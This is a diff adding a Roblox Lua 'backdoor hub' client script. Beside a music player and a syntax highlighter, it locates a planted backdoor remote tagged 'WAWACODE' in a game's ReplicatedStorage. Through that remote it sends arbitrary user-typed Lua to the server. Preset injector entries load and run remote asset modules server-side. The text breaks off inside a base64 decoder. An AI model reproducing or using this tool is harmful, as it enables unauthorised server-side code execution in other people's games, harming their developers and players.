@@ -1,0 +1,1430 @@
+print([[C00L BACKDOOR HUB! 
+
+ _______  _______  _______  ___                                          
+|       ||  _    ||  _    ||   |                                         
+|       || | |   || | |   ||   |                                         
+|       || | |   || | |   ||   |                                         
+|      _|| |_|   || |_|   ||   |___                                      
+|     |_ |       ||       ||       |                                     
+|_______||_______||_______||_______|                                     
+ _______  _______  _______  _     _  __    _                             
+|       ||       ||   _   || | _ | ||  |  | |                            
+|  _____||    _  ||  |_|  || || || ||   |_| |                            
+| |_____ |   |_| ||       ||       ||       |                            
+|_____  ||    ___||       ||       ||  _    |                            
+ _____| ||   |    |   _   ||   _   || | |   |                            
+|_______||___|    |__| |__||__| |__||_|  |__|                            
+ _______  _______  _______  ___   _  ______   _______  _______  ______   
+|  _    ||   _   ||       ||   | | ||      | |       ||       ||    _ |  
+| |_|   ||  |_|  ||       ||   |_| ||  _    ||   _   ||   _   ||   | ||  
+|       ||       ||       ||      _|| | |   ||  | |  ||  | |  ||   |_||_ 
+|  _   | |       ||      _||     |_ | |_|   ||  |_|  ||  |_|  ||    __  |
+| |_|   ||   _   ||     |_ |    _  ||       ||       ||       ||   |  | |
+|_______||__| |__||_______||___| |_||______| |_______||_______||___|  |_|
+ __   __  __   __  _______                                               
+|  | |  ||  | |  ||  _    |                                              
+|  |_|  ||  | |  || |_|   |                                              
+|       ||  |_|  ||       |                                              
+|       ||       ||  _   |                                               
+|   _   ||       || |_|   |                                              
+|__| |__||_______||_______|                                              
+
+]])
+
+local a = require(4689019964)
+
+-- notifaction creator
+function create(title,text)
+	task.wait()
+	game:GetService("StarterGui"):SetCore("SendNotification",{
+		Title = title or "", -- Required
+		Text = text or "", -- Required
+		Icon = "" -- Optional
+	})
+end
+
+local function assetloader(id)
+	return id	
+end
+
+-- services
+local TweenService = game:GetService("TweenService")
+
+-- just simple function to do ( "example" and etc)
+function add(str,txt)
+	return txt..str..txt
+end
+
+-- music list
+local musiclist = {
+	["Diamonds"]="rbxassetid://1846575559",
+	["Lazy Sunday"]="rbxassetid://1842241530",
+	["No More"]="rbxassetid://1846458016",
+	["Roselita"]="rbxassetid://1838857104",
+	["Solitaire"]="rbxassetid://1846457890",
+	["Town Talk"]="rbxassetid://1845756489"
+}
+
+local musiclistbackup = {}
+
+for i,v in pairs(musiclist) do table.insert(musiclistbackup,i) end
+
+-- strings
+local playerstring = add(game.Players.LocalPlayer.Name,'"')
+
+-- script list
+local buttons_injectors = {
+	c00llerchee = "require(96835698003070)",
+	nosoi = "local nosoi = require(112136724593392) \n nosoi.init(game.Players.".. game.Players.LocalPlayer.Name ..".Character.HumanoidRootPart.Position+Vector3.new(0,38.5,0))",
+	ForsakenFanLercheCharacter = "require(75430638106726).new(".. playerstring ..")",
+}
+
+-- notifaction creator but better??
+function create_withoptions(title,text, duration, btn1, btn2, callback)
+	game:GetService("StarterGui"):SetCore("SendNotification",{
+		Title = title or "", -- Required
+		Text = text or "", -- Required
+		Icon = "", -- Optional
+		Duration = duration or 5,
+		Callback = callback or nil,
+		Button1 = btn1 or "", 
+		Button2 = btn2 or "",
+	})
+end
+-- syntax
+local keywords = {
+	lua = {
+		"and", "break", "or", "else", "elseif", "if", "then", "until", "repeat", "while", "do", "for", "in", "end",
+		"local", "return", "function", "export"
+	},
+	rbx = {
+		"game", "workspace", "script", "math", "string", "table", "task", "wait", "select", "next", "Enum",
+		"error", "warn", "tick", "assert", "shared", "loadstring", "tonumber", "tostring", "type",
+		"typeof", "unpack", "print", "Instance", "CFrame", "Vector3", "Vector2", "Color3", "UDim", "UDim2", "Ray", "BrickColor",
+		"OverlapParams", "RaycastParams", "Axes", "Random", "Region3", "Rect", "TweenInfo",
+		"collectgarbage", "not", "utf8", "pcall", "xpcall", "_G", "setmetatable", "getmetatable", "os", "pairs", "ipairs"
+	},
+	operators = {
+		"#", "+", "-", "*", "%", "/", "^", "=", "~", "=", "<", ">", ",", ".", "(", ")", "{", "}", "[", "]", ";", ":", "`"
+	}
+}
+
+local colors = {
+	numbers = Color3.fromRGB(255, 198, 0),
+	boolean = Color3.fromRGB(214, 128, 23),
+	operator = Color3.fromRGB(232, 210, 40),
+	lua = Color3.fromRGB(160, 87, 248),
+	rbx = Color3.fromRGB(146, 180, 253),
+	str = Color3.fromRGB(56, 241, 87),
+	comment = Color3.fromRGB(103, 110, 149),
+	null = Color3.fromRGB(79, 79, 79),
+	call = Color3.fromRGB(130, 170, 255),
+	self_call = Color3.fromRGB(227, 201, 141),
+	local_color = Color3.fromRGB(199, 146, 234),
+	function_color = Color3.fromRGB(241, 122, 124),
+	self_color = Color3.fromRGB(146, 134, 234),
+	local_property = Color3.fromRGB(129, 222, 255),
+}
+
+local function createKeywordSet(keywords)
+	local keywordSet = {}
+	for _, keyword in ipairs(keywords) do
+		keywordSet[keyword] = true
+	end
+	return keywordSet
+end
+
+local luaSet = createKeywordSet(keywords.lua)
+local rbxSet = createKeywordSet(keywords.rbx)
+local operatorsSet = createKeywordSet(keywords.operators)
+
+local function getHighlight(tokens, index)
+	local token = tokens[index]
+
+	if colors[token .. "_color"] then
+		return colors[token .. "_color"]
+	end
+
+	if tonumber(token) then
+		return colors.numbers
+	elseif token == "nil" then
+		return colors.null
+	elseif token:sub(1, 2) == "--" then
+		return colors.comment
+	elseif operatorsSet[token] then
+		return colors.operator
+	elseif luaSet[token] then
+		return colors.rbx
+	elseif rbxSet[token] then
+		return colors.lua
+	elseif token:sub(1, 1) == "\"" or token:sub(1, 1) == "\'" then
+		return colors.str
+	elseif token == "true" or token == "false" then
+		return colors.boolean
+	end
+
+	if tokens[index + 1] == "(" then
+		if tokens[index - 1] == ":" then
+			return colors.self_call
+		end
+
+		return colors.call
+	end
+
+	if tokens[index - 1] == "." then
+		if tokens[index - 2] == "Enum" then
+			return colors.rbx
+		end
+
+		return colors.local_property
+	end
+end
+
+function run(source)
+	local tokens = {}
+	local currentToken = ""
+
+	local inString = false
+	local inComment = false
+	local commentPersist = false
+
+	for i = 1, #source do
+		local character = source:sub(i, i)
+
+		if inComment then
+			if character == "\n" and not commentPersist then
+				table.insert(tokens, currentToken)
+				table.insert(tokens, character)
+				currentToken = ""
+
+				inComment = false
+			elseif source:sub(i - 1, i) == "]]" and commentPersist then
+				currentToken ..= "]"
+
+				table.insert(tokens, currentToken)
+				currentToken = ""
+
+				inComment = false
+				commentPersist = false
+			else
+				currentToken = currentToken .. character
+			end
+		elseif inString then
+			if character == inString and source:sub(i-1, i-1) ~= "\\" or character == "\n" then
+				currentToken = currentToken .. character
+				inString = false
+			else
+				currentToken = currentToken .. character
+			end
+		else
+			if source:sub(i, i + 1) == "--" then
+				table.insert(tokens, currentToken)
+				currentToken = "-"
+				inComment = true
+				commentPersist = source:sub(i + 2, i + 3) == "[["
+			elseif character == "\"" or character == "\'" then
+				table.insert(tokens, currentToken)
+				currentToken = character
+				inString = character
+			elseif operatorsSet[character] then
+				table.insert(tokens, currentToken)
+				table.insert(tokens, character)
+				currentToken = ""
+			elseif character:match("[%w_]") then
+				currentToken = currentToken .. character
+			else
+				table.insert(tokens, currentToken)
+				table.insert(tokens, character)
+				currentToken = ""
+			end
+		end
+	end
+
+	table.insert(tokens, currentToken)
+
+	local highlighted = {}
+
+	for i, token in ipairs(tokens) do
+		local highlight = getHighlight(tokens, i)
+
+		if highlight then
+			local syntax = string.format("<font color = \"#%s\">%s</font>", highlight:ToHex(), token:gsub("<", "&lt;"):gsub(">", "&gt;"))
+
+			table.insert(highlighted, syntax)
+		else
+			table.insert(highlighted, token)
+		end
+	end
+
+	return table.concat(highlighted)
+end
+-- end of syntax
+
+local interface = game.Players.LocalPlayer.PlayerGui
+local r = nil
+
+local list = Instance.new("ScreenGui",interface)
+list.ResetOnSpawn = false
+list.IgnoreGuiInset = true
+list.Name = "HidedHub"
+local hided = Instance.new("Frame",list)
+hided.BackgroundTransparency = 1
+hided.Size = UDim2.new(0.052,0,1,0)
+hided.BackgroundColor3 = Color3.fromRGB(55,55,55)
+hided.AnchorPoint = Vector2.new(0.5,0.5)
+hided.Position = UDim2.new(0.95,0,0.5,0)
+
+local uilist = Instance.new("UIListLayout",hided)
+uilist.Padding = UDim.new(0,5)
+uilist.VerticalAlignment = Enum.VerticalAlignment.Center
+uilist.HorizontalAlignment = Enum.HorizontalAlignment.Center
+
+-- creates open button
+local function openbutton(name,frame)
+	local create_openbutton = Instance.new("TextButton",hided)
+	create_openbutton.Size = UDim2.new(1,0,0.07,0)
+	create_openbutton.BackgroundColor3 = Color3.fromRGB(55,55,55)
+	create_openbutton.TextColor3 = Color3.fromRGB(255,255,255)
+	create_openbutton.TextTransparency = 0.65
+	create_openbutton.TextXAlignment = Enum.TextXAlignment.Center
+	create_openbutton.Text = "Open ".. name
+	create_openbutton.Name = name
+	create_openbutton.AnchorPoint = Vector2.new(0.5,0.5)
+	create_openbutton.Position = UDim2.new(0.95,0,0.5,0)
+	create_openbutton.TextScaled = true
+
+	local imagelabel = Instance.new("ImageLabel",create_openbutton)
+	imagelabel.Size = UDim2.new(1,0,1,0)
+	imagelabel.BackgroundTransparency = 1
+	imagelabel.Image = "rbxassetid://74595603256262"
+	imagelabel.ImageColor3 = Color3.fromRGB(255,255,255)
+	imagelabel.AnchorPoint = Vector2.new(0.5,0.5)
+	imagelabel.Position = UDim2.new(0.5,0,0.5,0)
+	imagelabel.ScaleType = Enum.ScaleType.Fit
+	imagelabel.ImageTransparency = 0.9
+
+	create_openbutton.MouseButton1Click:Connect(function()
+		frame.Visible = true
+		create_openbutton:Destroy()
+	end)
+	frame.Visible = false
+	
+	return create_openbutton
+end
+
+-- creates hide button
+local function hidebutton(parent,func)
+	local hasfunction = false
+	if func then
+		hasfunction = true
+	end
+	
+	local hidebtn = Instance.new("TextButton",parent)
+	hidebtn.Size = UDim2.new(0.15,0,0.07,0)
+	hidebtn.BackgroundColor3 = Color3.fromRGB(85, 85, 85)
+	hidebtn.TextColor3 = Color3.fromRGB(255,255,255)
+	hidebtn.TextScaled = true
+	hidebtn.Text = "-"
+	hidebtn.Position = UDim2.new(0.83,0,-0.07,0)
+	hidebtn.AnchorPoint = Vector2.new(0.5,0.5)
+	hidebtn.MouseButton1Click:Connect(function()
+		if hasfunction==true then
+			func()
+		end
+	end)
+	
+	return hidebtn
+end
+
+-- create close button
+local function closebutton(parent,closes_what, func)
+	closes_what = closes_what or parent
+	local hasfunction = false
+	if func then
+		hasfunction = true
+	end
+	local closebtn = Instance.new("TextButton",parent)
+	closebtn.Size = UDim2.new(0.15,0,0.07,0)
+	closebtn.BackgroundColor3 = Color3.fromRGB(140, 63, 64)
+	closebtn.TextColor3 = Color3.fromRGB(255,255,255)
+	closebtn.TextScaled = true
+	closebtn.Text = "X"
+	closebtn.Position = UDim2.new(1,0,-0.07,0)
+	closebtn.AnchorPoint = Vector2.new(0.5,0.5)
+	closebtn.MouseButton1Click:Connect(function()
+		if hasfunction==true then
+			func()
+		end
+		closes_what:Destroy()
+	end)
+end
+
+-- creates frame template
+local function frame_template(parent,size,color,position,anchor,active,draggable,clips)
+	local frame = Instance.new("Frame",parent)
+	frame.Size = size or UDim2.new(0.25,0,0.25,0)
+	frame.BackgroundColor3 = color or Color3.fromRGB(45,45,45)
+	frame.Position = position or UDim2.new(0.5,0,0.5,0)
+	frame.AnchorPoint = anchor or Vector2.new(0.5,0.5)
+	frame.Active = active or true
+	frame.Draggable = draggable or true
+	frame.ClipsDescendants = clips or false
+	
+	return frame
+end
+
+-- music folder
+local music_alpha = Instance.new("Folder",workspace)
+music_alpha.Name = "MusicAlpha"
+
+-- music sound 
+function get_music()
+	music_alpha:ClearAllChildren()
+	local list1 = {}
+	local list2 = {}
+	for i,v in pairs(musiclist) do
+		table.insert(list1,v)
+		table.insert(list2,i)
+	end
+	local index_choice = math.random(1,#list1)
+	local sfx = Instance.new("Sound",music_alpha)
+	sfx.SoundId = list1[index_choice]
+	return sfx, list2[index_choice]
+end
+
+function Format(Int)
+	return string.format("%02i", Int)
+end
+
+function convertToMS(Seconds)
+	local Minutes = (Seconds - Seconds%60)/60
+	Seconds = Seconds - Minutes*60
+	local Hours = (Minutes - Minutes%60)/60
+	Minutes = Minutes - Hours*60
+	return Format(Minutes)..":"..Format(Seconds)
+end
+
+
+-- music player
+local function music_creator()
+	local hided = false
+	local ff = interface:FindFirstChild("SBPlayer")
+	if ff then
+		ff:Destroy()
+	end
+	local loopfunction
+	local sfx, title = get_music()
+	print(sfx,title)
+	local creategui = Instance.new("ScreenGui",interface)
+	creategui.ResetOnSpawn = false
+	creategui.IgnoreGuiInset = true
+	creategui.Name = "SBPlayer"
+	
+	local function change()
+		sfx, title = get_music()
+	end
+	
+	local function gettitleoutofid(sfx)
+		for i,v in pairs(musiclist) do
+			if v == sfx.SoundId then
+				return v
+			end
+		end
+	end
+	
+	local function getidoutoftitle(titls)
+		for i,v in pairs(musiclist) do
+			if v == titls then
+				return v
+			end
+		end
+	end
+	
+	local function titletonumber(titls)
+		local back = musiclistbackup
+		for i,v in pairs(back) do
+			if v == titls then
+				return i
+			end
+		end
+	end
+
+	
+	local function changeto(num)		
+		local backup = musiclistbackup
+		print(backup)
+		print(musiclistbackup[num])
+		title = musiclistbackup[num]
+		sfx.SoundId = musiclist[title]
+		sfx.TimePosition = 0
+		
+		if hided==true then
+			create("Music player","Now Playing: "..title.."\n Next Up: ".. musiclistbackup[num+1] or musiclistbackup[1])
+		end
+	end
+	local txtlabeltitle = nil
+	local txtlabeltitle2_effect = nil
+	local txtlabeltitle3_effect = nil
+	local backup_position = nil
+	local delayer = false
+	local spawnimage = nil
+	local function moved()
+		delayer = true
+		task.delay(0.2,function()
+			delayer = false
+			txtlabeltitle.Position = backup_position
+		end)
+	end
+	
+	local function nexth()
+		if delayer==true then return end
+		local num = titletonumber(title)
+		if num+1 > #musiclistbackup then
+			num = 1
+		else
+			num = num+1
+		end
+		TweenService:Create(txtlabeltitle,TweenInfo.new(0.2),{Position = txtlabeltitle.Position - UDim2.new(1,0,0,0)}):Play()
+		txtlabeltitle2_effect.Text = "Current Music: ".. musiclistbackup[num]
+		game.TweenService:Create(spawnimage,TweenInfo.new(0.2),{Rotation = spawnimage.Rotation+50}):Play()
+		moved()
+		changeto(num)
+	end
+	local function previous()
+		if delayer==true then return end
+		local num = titletonumber(title)
+		if num-1 <= 0 then
+			num = #musiclistbackup
+		else
+			num = num-1
+		end
+		TweenService:Create(txtlabeltitle,TweenInfo.new(0.2),{Position = txtlabeltitle.Position + UDim2.new(1,0,0,0)}):Play()
+		txtlabeltitle3_effect.Text = "Current Music: ".. musiclistbackup[num]
+		
+		game.TweenService:Create(spawnimage,TweenInfo.new(0.2),{Rotation = spawnimage.Rotation-50}):Play()
+		
+		moved()
+		changeto(num)
+	end
+
+
+	local function update(titletxt, timer, bar)
+		titletxt.Text = "Current Music: ".. title
+		timer.Text = convertToMS(sfx.TimePosition) .."/"..convertToMS(sfx.TimeLength)
+		bar.Size = UDim2.new(sfx.TimePosition/sfx.TimeLength,0,1,0)
+	end
+	
+	local frame = frame_template(creategui,UDim2.new(0.3,0,0.3,0))
+	local xbutton = closebutton(frame,creategui,function()
+		loopfunction:Disconnect()
+		music_alpha:ClearAllChildren()
+	end)
+	local hide = hidebutton(frame,function()
+		hided = true
+		openbutton("music player", frame)
+		frame.Visible = false
+	end)
+	
+	frame:GetPropertyChangedSignal("Visible"):Connect(function()
+		if frame.Visible == true then
+			hided = false
+		end
+	end)
+	
+	local line = Instance.new("CanvasGroup",frame)
+	line.AnchorPoint = Vector2.new(0.5,0.5)
+	line.Size = UDim2.new(0.9,0,0.05,0)
+	line.Position = UDim2.new(0.5,0,0.88,0)
+	line.BackgroundColor3 = Color3.fromRGB(156, 156, 156)
+	line.ClipsDescendants = true
+	
+	local framebox = Instance.new("Frame",frame)
+	framebox.BackgroundTransparency = 1
+	framebox.Size = UDim2.new(1,0,0.1,0)
+	framebox.Position = UDim2.new(0,0,0.035,0)
+	framebox.ClipsDescendants = true
+	
+	txtlabeltitle = Instance.new("TextLabel",framebox)
+	txtlabeltitle.TextScaled = true
+	txtlabeltitle.BackgroundTransparency = 1
+	txtlabeltitle.Text = "Current Music: idkkk"
+	txtlabeltitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+	txtlabeltitle.Size = UDim2.new(1,0,1,0)
+	txtlabeltitle.Position = UDim2.new(0,0,0,0)
+	txtlabeltitle.Text = "Current Music: ".. title
+	
+	txtlabeltitle2_effect = Instance.new("TextLabel",txtlabeltitle)
+	txtlabeltitle2_effect.BackgroundTransparency = 1
+	txtlabeltitle2_effect.TextStrokeTransparency = 0.5
+	txtlabeltitle2_effect.TextColor3 = Color3.fromRGB(255, 255, 255)
+	txtlabeltitle2_effect.Size = UDim2.new(1,0,1,0)
+	txtlabeltitle2_effect.Position = UDim2.new(1,0,0,0)
+	txtlabeltitle2_effect.Text = "right"
+	txtlabeltitle2_effect.TextScaled = true
+	
+	txtlabeltitle3_effect = Instance.new("TextLabel",txtlabeltitle)
+	txtlabeltitle3_effect.BackgroundTransparency = 1
+	txtlabeltitle3_effect.TextStrokeTransparency = 0.5
+	txtlabeltitle3_effect.TextColor3 = Color3.fromRGB(255, 255, 255)
+	txtlabeltitle3_effect.Size = UDim2.new(1,0,1,0)
+	txtlabeltitle3_effect.Position = UDim2.new(-1,0,0,0)
+	txtlabeltitle3_effect.Text = "left"
+	txtlabeltitle3_effect.TextScaled = true
+	
+	backup_position = txtlabeltitle.Position
+	local function btn(pos)
+		local btn = Instance.new("TextButton",frame)
+		btn.BackgroundTransparency = 0.15
+		btn.BackgroundColor3 = Color3.fromRGB(185, 185, 185)
+		btn.Size = UDim2.new(0.1,0,0.1,0)
+		btn.Position = pos
+		btn.Text = ""
+		btn.AnchorPoint = Vector2.new(0.5,0.5)
+		btn.TextScaled = true
+		btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+		return btn
+	end
+	
+	local playbutton = btn(UDim2.new(0.5,0,0.75,0))
+	playbutton.Text="►"
+	playbutton.MouseButton1Click:Connect(function()
+		if playbutton.Text=="►" then
+			sfx:Pause()
+			playbutton.Text="■"
+		else
+			sfx:Resume()
+			playbutton.Text="►"
+		end
+	end)
+	
+	local nextbutton = btn(UDim2.new(0.6,0,0.75,0))
+	nextbutton.Text=">>"
+	nextbutton.MouseButton1Click:Connect(function()
+		nexth()
+	end)
+	local prevbutton = btn(UDim2.new(0.4,0,0.75,0))
+	prevbutton.Text="<<"
+	prevbutton.MouseButton1Click:Connect(function()
+		previous()
+	end)
+	
+	sfx.Ended:Connect(function()
+		nexth()
+		sfx:Resume()
+	end)
+	
+	sfx:Resume()
+	local txtlabeltimer = Instance.new("TextLabel",line)
+	txtlabeltimer.TextScaled = true
+	txtlabeltimer.BackgroundTransparency = 1
+	txtlabeltimer.Text = "0:00 / 0:00"
+	txtlabeltimer.TextColor3 = Color3.fromRGB(255, 255, 255)
+	txtlabeltimer.Size = UDim2.new(1,0,1,0)
+	txtlabeltimer.ZIndex = 8
+	local bar = Instance.new("Frame",line)
+	bar.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+	bar.Size = UDim2.new(0,0,1,0)
+	bar.Position = UDim2.new(0,0,0,0)
+	bar.BorderSizePixel = 0
+	bar.Size = UDim2.new(sfx.TimePosition/sfx.TimeLength,0,1,0)
+
+	local change_time = Instance.new("TextButton",line)
+	change_time.BackgroundTransparency = 1
+	change_time.Text = ""
+	change_time.Size = UDim2.new(1,0,1,0)
+	change_time.Position = UDim2.new(0.5,0,0.5,0)
+	change_time.AnchorPoint = Vector2.new(0.5,0.5)	
+	change_time.ZIndex = 5
+	change_time.MouseButton1Click:Connect(function()
+		local mouse = game.Players.LocalPlayer:GetMouse()
+		local mouse_x = mouse.X
+		local x = mouse_x - line.AbsolutePosition.X
+		local m = x*sfx.TimeLength/line.AbsoluteSize.X
+		sfx.TimePosition=m
+	end)
+	
+	local bars_framelayer1 = Instance.new("Frame",frame)
+	bars_framelayer1.Size = UDim2.new(0.85,0,0.45,0)
+	bars_framelayer1.Position = UDim2.new(0.5,0,0.45,0)
+	bars_framelayer1.AnchorPoint = Vector2.new(0.5,0.5)
+	bars_framelayer1.BackgroundTransparency = 1
+	
+
+	local bars_frame = Instance.new("Frame",bars_framelayer1)
+	bars_frame.Size = UDim2.new(1,0,1,0)
+	bars_frame.BackgroundTransparency = 1
+
+	local uilist = Instance.new("UIListLayout",bars_frame)
+	uilist.FillDirection = Enum.FillDirection.Horizontal
+	uilist.HorizontalAlignment = Enum.HorizontalAlignment.Center
+	
+	local amountofbars = 13
+	bars_frame.ClipsDescendants = true
+	uilist.Padding=UDim.new(0,amountofbars/2)
+	
+	local bars = {}
+	
+	for i = 1, amountofbars do
+		local bar = Instance.new("Frame",bars_frame)
+
+		table.insert(bars,bar)
+		bar.BackgroundColor3 = Color3.fromRGB(255,255,255)
+		bar.BorderSizePixel = 0
+		bar.Size = UDim2.new(0.05,0,0.5,0)
+		bar.Name = i
+		bar.ZIndex = 5
+	end
+	bars_frame.Rotation = 180
+	local sizes = {}
+	for i, bar in ipairs(bars) do
+		sizes[i] = 0
+	end
+	
+	local uicorner = Instance.new("UICorner",line)
+	uicorner.CornerRadius = UDim.new(1,0)
+
+	local uicorner = Instance.new("UICorner",bar)
+	uicorner.CornerRadius = UDim.new(1,0)
+
+
+	local imagelabel = Instance.new("ImageLabel",bars_framelayer1)
+	imagelabel.Size = UDim2.new(1,0,1,0)
+	imagelabel.BackgroundTransparency = 1
+	imagelabel.Image = "rbxassetid://74595603256262"
+	imagelabel.ImageColor3 = Color3.fromRGB(255,255,255)
+	imagelabel.AnchorPoint = Vector2.new(0.5,0.5)
+	imagelabel.Position = UDim2.new(0.5,0,0.5,0)
+	imagelabel.ScaleType = Enum.ScaleType.Fit
+	imagelabel.ImageTransparency = 0.8
+	spawnimage = imagelabel
+	loopfunction = game["Run Service"].RenderStepped:Connect(function()
+		if delayer==false then
+			imagelabel.Rotation += 0.1
+		end
+		local amplitude = sfx.PlaybackLoudness / 3
+		-- loop all bars
+		for i, bar in ipairs(bars) do
+			-- get a random offset for each bar
+			local randomOffset = math.random() * amplitude 
+			-- tween the size towards the new size
+			sizes[i] += (amplitude + randomOffset - sizes[i]) * 0.2
+			-- set the bars size
+			bar.Size = UDim2.new(0.05, 0, 0, sizes[i])
+		end
+		
+		update(txtlabeltitle, txtlabeltimer,bar)
+		
+	end)
+	
+	sfx:Play()
+end
+
+-- SS executor creator
+local function gui_create()
+	if r==nil then
+		create("Error!","Remote not found, try to find again!")
+		return
+	end
+	local plrGui_ = Instance.new("ScreenGui",interface)
+	plrGui_.ResetOnSpawn = false
+	plrGui_.IgnoreGuiInset = true
+	plrGui_.Name = "SBExecutor"
+
+	local frame = Instance.new("Frame",plrGui_)
+	frame.Size = UDim2.new(0.25,0,0.25,0)
+	frame.BackgroundColor3 = Color3.fromRGB(45,45,45)
+	frame.Position = UDim2.new(0.5,0,0.5,0)
+	frame.AnchorPoint = Vector2.new(0.5,0.5)
+	frame.Active = true
+	frame.Draggable = true
+	frame.ClipsDescendants = false
+	local scrollingframe = Instance.new("ScrollingFrame",frame)
+	scrollingframe.Size = UDim2.new(1,0,.75,0)
+	scrollingframe.BackgroundTransparency = 1
+	scrollingframe.CanvasSize = UDim2.new(0,0,0,0)
+	scrollingframe.ScrollBarThickness = 2
+	scrollingframe.ScrollBarImageColor3 = Color3.fromRGB(255,255,255)
+
+	local textbox = Instance.new("TextBox",scrollingframe)
+	textbox.Text = ""
+	textbox.PlaceholderText = ""
+	textbox.BackgroundColor3 = Color3.fromRGB(30,30,30)
+	textbox.BorderSizePixel = 0
+	textbox.TextColor3 = Color3.fromRGB(255,255,255)
+	textbox.TextTransparency = 0.65
+	textbox.TextXAlignment = Enum.TextXAlignment.Left
+	textbox.TextYAlignment = Enum.TextYAlignment.Top
+	textbox.TextSize = 20
+	textbox.TextWrapped = true
+	textbox.Size = UDim2.new(1,0,1,0)
+	textbox.AutomaticSize = Enum.AutomaticSize.Y
+
+	local txt = Instance.new("TextLabel",textbox)
+	txt.Text = ""
+	txt.BackgroundTransparency = 1
+	txt.TextColor3 = Color3.fromRGB(255,255,255)
+	txt.TextXAlignment = Enum.TextXAlignment.Left
+	txt.TextYAlignment = Enum.TextYAlignment.Top
+	txt.TextSize = 20
+	txt.RichText = true
+	txt.TextWrapped = true
+	txt.Size = UDim2.new(1,0,1,0)
+	txt.ZIndex = 2
+	textbox.ClearTextOnFocus = false
+	textbox:GetPropertyChangedSignal("Text"):Connect(function()
+		txt.Text = run(textbox.Text)
+		scrollingframe.CanvasSize = UDim2.new(0,0,0,txt.TextBounds.Y+40)
+	end)
+
+	local list = Instance.new("ScrollingFrame",frame)
+	list.Size = UDim2.new(0.25,0,1,0)
+	list.BackgroundTransparency = 0.5
+	list.CanvasSize = UDim2.new(0,0,0,0)
+	list.ScrollBarThickness = 2
+	list.ScrollBarImageColor3 = Color3.fromRGB(255,255,255)
+	list.AnchorPoint = Vector2.new(0.5,0.5)
+	list.Position = UDim2.new(-0.16,0,0.5,0)
+	list.AutomaticCanvasSize = Enum.AutomaticSize.Y
+
+	local uilist = Instance.new("UIListLayout",list)
+	uilist.FillDirection = Enum.FillDirection.Vertical
+	uilist.SortOrder = Enum.SortOrder.LayoutOrder
+
+
+	for i,v in pairs(buttons_injectors) do
+		local textButton = Instance.new("TextButton",list)
+		textButton.Text = i
+		textButton.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
+		textButton.Size = UDim2.new(1,0,0.1,0)
+		textButton.TextColor3 = Color3.fromRGB(255,255,255)
+		textButton.TextScaled = true
+		textButton.AutoButtonColor = true
+		textButton.Name = i
+		textButton.MouseButton1Click:Connect(function()
+			textbox.Text = v
+		end)
+		task.wait()
+	end
+
+
+
+	local textButton = Instance.new("TextButton",frame)
+	textButton.Text = "Execute"
+	textButton.BackgroundColor3 = Color3.fromRGB(37, 65, 38)
+	textButton.Size = UDim2.new(0.35,0,0.2,0)
+	textButton.TextColor3 = Color3.fromRGB(255,255,255)
+	textButton.Position = UDim2.new(0.015,0,.7+textButton.Size.Y.Scale/2.6,0)
+	textButton.TextScaled = true
+
+	local syntaxenable = Instance.new("TextButton",frame)
+	syntaxenable.Text = "Syntax: T"
+	syntaxenable.BackgroundColor3 = Color3.fromRGB(123, 47, 186)
+	syntaxenable.Size = UDim2.new(0.15,0,0.2,0)
+	syntaxenable.TextColor3 = Color3.fromRGB(255,255,255)
+	syntaxenable.Position = UDim2.new(0.42,0,.7+syntaxenable.Size.Y.Scale/2.6,0)
+	syntaxenable.TextScaled = true
+	syntaxenable.MouseButton1Click:Connect(function()
+		if syntaxenable.Text == "Syntax: F" then
+			syntaxenable.Text = "Syntax: T"
+			txt.Visible = true
+			textbox.TextTransparency = 0.65
+		else
+			syntaxenable.Text = "Syntax: F"
+			txt.Visible = false
+			textbox.TextTransparency = 0
+		end
+	end)
+
+	textButton.MouseButton1Click:Connect(function()
+		r:InvokeServer(textbox.Text)
+	end)
+
+	closebutton(frame,plrGui_)
+
+	local clear = Instance.new("TextButton",frame)
+	clear.Text = "Clear"
+	clear.BackgroundColor3 = Color3.fromRGB(65, 27, 28)
+	clear.Size = UDim2.new(0.35,0,0.2,0)
+	clear.TextColor3 = Color3.fromRGB(255,255,255)
+	clear.Position = UDim2.new(0.63,0,.7+clear.Size.Y.Scale/2.6,0)
+	clear.TextScaled = true
+	clear.MouseButton1Click:Connect(function()
+		textbox.Text = ""
+	end)
+
+	return plrGui_
+end
+-- Data creator for detecting fresh backdoors
+local setter = Instance.new("BoolValue",workspace)
+setter.Name = "Data"
+
+setter:SetAttribute("Day",os.date("%A"))
+setter:SetAttribute("Month",os.date("%B"))
+setter:SetAttribute("Years",os.date("%Y"))
+local detect = os.date("%A")
+local weekend = false
+if detect == "Sunday" or detect == "Saturday" or detect == "Friday" then
+	weekend = true
+else
+	weekend = false
+end
+
+-- backdoor finding (may not good)
+local function find()
+	local finds =  nil
+
+	for i,v in pairs(game.ReplicatedStorage:GetChildren()) do
+		if v.Name == "." then
+			finds = v
+			break
+		end
+	end
+
+	if finds == nil then
+		create("Error!", "Remote Event/Function is NOT found in this game. Backdoor will not work here. Sorry! D:")
+		return false
+	end
+
+	if finds:GetTags()[1] == "WAWACODE" then
+		if finds:GetAttribute("Day")==setter:GetAttribute("Day")
+			and finds:GetAttribute("Month")==setter:GetAttribute("Month")
+			and finds:GetAttribute("Years")==setter:GetAttribute("Years")
+			and finds:GetAttribute("IsWeekend")==weekend then
+			r = finds
+			return true
+		else
+			local day,month,year,weekend = finds:GetAttribute("Day"),finds:GetAttribute("Month"),finds:GetAttribute("Years"),find:GetAttribute("Weekend")
+			create("Error!", "Date you entered not match. Please rejoin to fresh new server. More info: "..day.."/"..month.."/"..year..". Weekend: "..tostring(weekend)..". Backdoor will not work here. Sorry! D:")
+			return false
+		end
+	else
+
+		local found = false
+		local obj = nil
+		for i,v in pairs(game.ReplicatedStorage:GetChildren()) do
+			if v.Name == "." and v:GetTags()[1] == "WAWACODE" then
+				found = true
+				obj = v
+				break
+			end
+		end
+
+		if found == false then
+			create("Error!", "Remote Event/Function is NOT found in this game. Backdoor will not work here. Sorry! D:")
+			return false
+		end
+		if found == true and obj:GetTags()[1] ~= "WAWACODE" then
+			create("Error!", "Remote Event/Function is fake one by developers. Backdoor will not work here. Sorry! D:")
+			return false
+		end
+	end
+end
+
+-- its obvious
+function from_base64(data)
+	local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+	data = string.gsub(data, '[^'..b..'=]', '')
+	return (data:gsub('.', function(x)
+		if (x == '=') then return '' end
